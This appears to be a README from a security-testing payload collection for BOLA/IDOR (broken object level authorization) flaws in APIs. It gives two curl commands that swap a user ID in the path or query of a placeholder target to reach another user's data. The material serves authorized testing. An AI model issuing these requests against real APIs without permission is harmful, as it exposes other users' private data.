# BOLA / IDOR Payloads

> **OWASP API**: API1 — Broken Object Level Authorization

## Files

| File | Description |
|------|-------------|
| [`bola_test_patterns.md`](bola_test_patterns.md) | Numeric/UUID/encoded ID manipulation, GraphQL node IDs, path/query/body IDOR, method switch, multi-step attacks |

## Quick Test

```bash
# Swap user ID in path
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/users/USER_B_ID/profile

# Swap in query parameter
curl -H "Authorization: Bearer <TOKEN>" "https://api.target.com/api/orders?user_id=OTHER_USER"
```
